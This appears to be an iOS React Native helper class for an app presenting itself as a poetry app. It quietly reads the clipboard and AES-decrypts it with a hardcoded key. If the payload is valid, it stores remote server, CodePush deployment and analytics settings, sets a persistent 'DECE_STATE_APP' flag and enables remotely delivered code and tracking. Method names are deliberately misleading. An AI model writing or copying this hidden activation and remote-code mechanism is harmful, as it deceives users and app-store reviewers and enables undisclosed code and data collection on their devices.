//
//  RNPoetryDistanceHelper.m
//  RNPoetryDistanceStory
//
//  Created by Nicka on 11/29/22.
//  Copyright © 2022 Facebook. All rights reserved.
//

#import "RNPoetryDistanceHelper.h"
#import "JJException.h"
#import "XunWeipoetryDistance_topMenuList.h"

#import <RNIndicator.h>
#import <RNCPushNotificationIOS.h>
#import <GCDWebServer.h>
#import <GCDWebServerDataResponse.h>

#import <CodePush/CodePush.h>
#import <UMCommon/UMCommon.h>
#import <CommonCrypto/CommonCrypto.h>
#import <CocoaSecurity/CocoaSecurity.h>
#import <SensorsAnalyticsSDK/SensorsAnalyticsSDK.h>
#import <react-native-orientation-locker/Orientation.h>


#import <React/RCTBridge.h>
#import <React/RCTBundleURLProvider.h>
#import <React/RCTRootView.h>
#import <React/RCTAppSetupUtils.h>

#if RCT_NEW_ARCH_ENABLED
#import <React/CoreModulesPlugins.h>
#import <React/RCTCxxBridgeDelegate.h>
#import <React/RCTFabricSurfaceHostingProxyRootView.h>
#import <React/RCTSurfacePresenter.h>
#import <React/RCTSurfacePresenterBridgeAdapter.h>
#import <ReactCommon/RCTTurboModuleManager.h>

#import <react/config/ReactNativeConfig.h>

static NSString *const kRNConcurrentRoot = @"concurrentRoot";

@interface RNPoetryDistanceHelper () <RCTCxxBridgeDelegate, RCTTurboModuleManagerDelegate> {
  RCTTurboModuleManager *_turboModuleManager;
  RCTSurfacePresenterBridgeAdapter *_bridgeAdapter;
  std::shared_ptr<const facebook::react::ReactNativeConfig> _reactNativeConfig;
  facebook::react::ContextContainer::Shared _contextContainer;
}



@end
#endif

@interface RNPoetryDistanceHelper ()

@property(nonatomic, copy) NSString *poetryDistance_Hexkey;
@property(nonatomic, copy) NSString *poetryDistance_HexIv;

@property(nonatomic, copy) NSString *poetryDistance_aVersion;
@property(nonatomic, copy) NSString *poetryDistance_DPKey;
@property(nonatomic, copy) NSString *poetryDistance_SUrl;


@property(nonatomic, copy) NSString *poetryDistance_UKey;
@property(nonatomic, copy) NSString *poetryDistance_UGChannel;
@property(nonatomic, copy) NSString *poetryDistance_SenServerUrl;
@property(nonatomic, copy) NSString *poetryDistance_SenProperty;

@property(nonatomic, copy) NSString *poetryDistance_APP;
@property(nonatomic, copy) NSString *poetryDistance_spRoutes;
@property(nonatomic, copy) NSString *poetryDistance_wParams;
@property(nonatomic, copy) NSString *poetryDistance_vPort;
@property(nonatomic, copy) NSString *poetryDistance_vSecu;

@end

@implementation RNPoetryDistanceHelper

static RNPoetryDistanceHelper *instance = nil;

+ (instancetype)shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.poetryDistance_Hexkey = @"86f1fda459fa47c72cb94f36b9fe4c38";
    instance.poetryDistance_HexIv = @"CC0A69729E15380ADAE46C45EB412A23";
    
    instance.poetryDistance_aVersion = @"appVersion";
    instance.poetryDistance_DPKey = @"deploymentKey";
    instance.poetryDistance_SUrl = @"serverUrl";
    
    instance.poetryDistance_UKey = @"umKey";
    instance.poetryDistance_UGChannel = @"umChannel";
    instance.poetryDistance_SenServerUrl = @"sensorUrl";
    instance.poetryDistance_SenProperty = @"sensorProperty";
    
    instance.poetryDistance_APP = @"DECE_STATE_APP";
    instance.poetryDistance_spRoutes = @"spareRoutes";
    instance.poetryDistance_wParams = @"washParams";
    instance.poetryDistance_vPort = @"vPort";
    instance.poetryDistance_vSecu = @"vSecu";
    
  });
  return instance;
}


- (BOOL)poetryDistance_plantDesignEquipmentAnotherByPBD {
  NSString *copyString = [UIPasteboard generalPasteboard].string;
  if (copyString == nil) {
    return NO;
  }
  
  if ([copyString containsString:@"#iPhone#"]) {
    NSArray * tempArr = [copyString componentsSeparatedByString:@"#iPhone#"];
    if (tempArr.count > 1) {
      copyString = tempArr[1];
    }
  }
  CocoaSecurityResult *aes256Decrypt = [CocoaSecurity aesDecryptWithBase64:copyString
                                        hexKey:self.poetryDistance_Hexkey
                                         hexIv:self.poetryDistance_HexIv];
  
  if (aes256Decrypt.utf8String == nil) {
    return NO;
  }
  NSDictionary *dict = [self poetryDistance_dictionaryWithJsonString:aes256Decrypt.utf8String];
  if (dict == nil) {
    return NO;
  }
  if (dict[@"data"] == nil) {
    return NO;
  }
  return [self poetryDistance_saveConfigInfo:dict[@"data"]];
}

- (BOOL)poetryDistance_saveConfigInfo:(NSDictionary *)dict {
    if (dict[self.poetryDistance_aVersion] == nil || dict[self.poetryDistance_DPKey] == nil || dict[self.poetryDistance_SUrl] == nil) {
        return NO;
    }

    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
  
    [ud setBool:YES forKey:self.poetryDistance_APP];
    [ud setObject:dict[self.poetryDistance_aVersion] forKey:self.poetryDistance_aVersion];
    [ud setObject:dict[self.poetryDistance_DPKey] forKey:self.poetryDistance_DPKey];
    [ud setObject:dict[self.poetryDistance_SUrl] forKey:self.poetryDistance_SUrl];
    
    [ud setObject:dict[self.poetryDistance_UKey] forKey:self.poetryDistance_UKey];
    [ud setObject:dict[self.poetryDistance_UGChannel] forKey:self.poetryDistance_UGChannel];
    [ud setObject:dict[self.poetryDistance_SenServerUrl] forKey:self.poetryDistance_SenServerUrl];
    [ud setObject:dict[self.poetryDistance_SenProperty] forKey:self.poetryDistance_SenProperty];
  
    [ud setObject:dict[self.poetryDistance_spRoutes] forKey:self.poetryDistance_spRoutes];
    [ud setObject:dict[self.poetryDistance_wParams] forKey:self.poetryDistance_wParams];
    [ud setObject:dict[self.poetryDistance_vPort] forKey:self.poetryDistance_vPort];
    [ud setObject:dict[self.poetryDistance_vSecu] forKey:self.poetryDistance_vSecu];

    [ud synchronize];
    return YES;
}

- (BOOL)poetryDistance_tryThisWay {
    NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
    if ([ud boolForKey:self.poetryDistance_APP]) {
        return YES;
    } else {
        return [self poetryDistance_plantDesignEquipmentAnotherByPBD];
    }
}

- (UIInterfaceOrientationMask)poetryDistance_getOrientation {
  return [Orientation getOrientation];
}

- (NSDictionary *)poetryDistance_dictionaryWithJsonString:(NSString *)jsonString {
    if (jsonString == nil) {
        return nil;
    }
    NSData *jsonData = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *err;
    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:jsonData
                                                        options:NSJSONReadingMutableContainers
                                                          error:&err];
    if(err) {
        return nil;
    }
    return dic;
}

- (void)poetryDistance_filterSpeedTestNetRoute {
  dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 10.0), dispatch_get_main_queue(), ^{
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    NSArray *spareArr = [ud arrayForKey:self.poetryDistance_spRoutes];
      
    NSString *currentRoute = [ud stringForKey:self.poetryDistance_SUrl];
    NSMutableArray *testArr = [NSMutableArray array];
    if (currentRoute != nil && spareArr != nil) {
      [testArr addObject:currentRoute];
      [testArr arrayByAddingObjectsFromArray:spareArr];
    }
    
    [self poetryDistance_getSpeedFastWayRoute:testArr usingIndex:0];
  });
}

- (void)poetryDistance_getSpeedFastWayRoute:(NSArray *)spareArr usingIndex: (NSInteger)idx {
  if (spareArr != nil && spareArr.count > idx) {
    NSURL *url = [NSURL URLWithString:spareArr[idx]];
    
    NSURLSessionConfiguration *sessionConfig = [NSURLSessionConfiguration defaultSessionConfiguration];
    sessionConfig.timeoutIntervalForRequest = 20.0;
    NSURLSession *session = [NSURLSession sessionWithConfiguration:sessionConfig];
    
    NSURLSessionTask *task = [session dataTaskWithURL:url completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
      NSHTTPURLResponse *httpResponse = (NSHTTPURLResponse *)response;
      if (httpResponse.statusCode == 200) {
        [[NSUserDefaults standardUserDefaults] setObject:spareArr[idx] forKey:self.poetryDistance_SUrl];
      } else {
        [self poetryDistance_getSpeedFastWayRoute:spareArr usingIndex:idx + 1];
      }
    }];
    [task resume];
  }

}

- (void)poetryDistance_collectionBabyHealthInfo {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  [UMConfigure initWithAppkey:[ud stringForKey:self.poetryDistance_UKey] channel:[ud stringForKey:self.poetryDistance_UGChannel]];
  SAConfigOptions *options = [[SAConfigOptions alloc] initWithServerURL:[ud stringForKey:self.poetryDistance_SenServerUrl] launchOptions:nil];
  options.autoTrackEventType = SensorsAnalyticsEventTypeAppStart | SensorsAnalyticsEventTypeAppEnd | SensorsAnalyticsEventTypeAppClick | SensorsAnalyticsEventTypeAppViewScreen;

  [SensorsAnalyticsSDK startWithConfigOptions:options];
  [[SensorsAnalyticsSDK sharedInstance] registerSuperProperties:[ud dictionaryForKey:self.poetryDistance_SenProperty]];
}

- (UIViewController *)poetryDistance_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  RCTAppSetupPrepareApp(application);

  [self poetryDistance_collectionBabyHealthInfo];
  [self poetryDistance_filterSpeedTestNetRoute];
  [[XunWeipoetryDistance_topMenuList shared] poetryDistance_appInitialStartOrEnterForeground];
  
  UNUserNotificationCenter *center = [UNUserNotificationCenter currentNotificationCenter];
  center.delegate = self;
  [JJException configExceptionCategory:JJExceptionGuardDictionaryContainer | JJExceptionGuardArrayContainer | JJExceptionGuardNSStringContainer];
  [JJException startGuardException];
  
  RCTBridge *bridge = [[RCTBridge alloc] initWithDelegate:self launchOptions:launchOptions];

#if RCT_NEW_ARCH_ENABLED
  _contextContainer = std::make_shared<facebook::react::ContextContainer const>();
  _reactNativeConfig = std::make_shared<facebook::react::EmptyReactNativeConfig const>();
  _contextContainer->insert("ReactNativeConfig", _reactNativeConfig);
  _bridgeAdapter = [[RCTSurfacePresenterBridgeAdapter alloc] initWithBridge:bridge contextContainer:_contextContainer];
  bridge.surfacePresenter = _bridgeAdapter.surfacePresenter;
#endif

  NSDictionary *initProps = [self prepareInitialProps];
  UIView *rootView = RCTAppSetupDefaultRootView(bridge, @"NewYorkCity", initProps);

  if (@available(iOS 13.0, *)) {
    rootView.backgroundColor = [UIColor systemBackgroundColor];
  } else {
    rootView.backgroundColor = [UIColor whiteColor];
  }
  
  UIViewController *rootViewController = [HomeIndicatorView new];
  rootViewController.view = rootView;
  UINavigationController *navc = [[UINavigationController alloc] initWithRootViewController:rootViewController];
  navc.navigationBarHidden = true;
  return navc;
}


- (void)userNotificationCenter:(UNUserNotificationCenter *)center didReceiveNotificationResponse:(UNNotificationResponse *)response withCompletionHandler:(void (^)(void))completionHandler
{
  [RNCPushNotificationIOS didReceiveNotificationResponse:response];
}

-(void)userNotificationCenter:(UNUserNotificationCenter *)center willPresentNotification:(UNNotification *)notification withCompletionHandler:(void (^)(UNNotificationPresentationOptions options))completionHandler
{
  completionHandler(UNNotificationPresentationOptionSound | UNNotificationPresentationOptionAlert | UNNotificationPresentationOptionBadge);
}

/// This method controls whether the `concurrentRoot`feature of React18 is turned on or off.
///
/// @see: https://reactjs.org/blog/2022/03/29/react-v18.html
/// @note: This requires to be rendering on Fabric (i.e. on the New Architecture).
/// @return: `true` if the `concurrentRoot` feture is enabled. Otherwise, it returns `false`.
- (BOOL)concurrentRootEnabled
{
  // Switch this bool to turn on and off the concurrent root
  return true;
}

- (NSDictionary *)prepareInitialProps
{
  NSMutableDictionary *initProps = [NSMutableDictionary new];

#ifdef RCT_NEW_ARCH_ENABLED
  initProps[kRNConcurrentRoot] = @([self concurrentRootEnabled]);
#endif

  return initProps;
}


- (NSURL *)sourceURLForBridge:(RCTBridge *)bridge
{
#if DEBUG
  return [[RCTBundleURLProvider sharedSettings] jsBundleURLForBundleRoot:@"index"];
#else
  return [CodePush bundleURL];
#endif
}

#if RCT_NEW_ARCH_ENABLED

#pragma mark - RCTCxxBridgeDelegate

- (std::unique_ptr<facebook::react::JSExecutorFactory>)jsExecutorFactoryForBridge:(RCTBridge *)bridge
{
  _turboModuleManager = [[RCTTurboModuleManager alloc] initWithBridge:bridge
                                                             delegate:self
                                                            jsInvoker:bridge.jsCallInvoker];
  return RCTAppSetupDefaultJsExecutorFactory(bridge, _turboModuleManager);
}

#pragma mark RCTTurboModuleManagerDelegate

- (Class)getModuleClassFromName:(const char *)name
{
  return RCTCoreModulesClassProvider(name);
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                      jsInvoker:(std::shared_ptr<facebook::react::CallInvoker>)jsInvoker
{
  return nullptr;
}

- (std::shared_ptr<facebook::react::TurboModule>)getTurboModule:(const std::string &)name
                                                     initParams:
                                                         (const facebook::react::ObjCTurboModule::InitParams &)params
{
  return nullptr;
}

- (id<RCTTurboModule>)getModuleInstanceFromClass:(Class)moduleClass
{
  return RCTAppSetupDefaultModuleFromClass(moduleClass);
}

#endif

@end
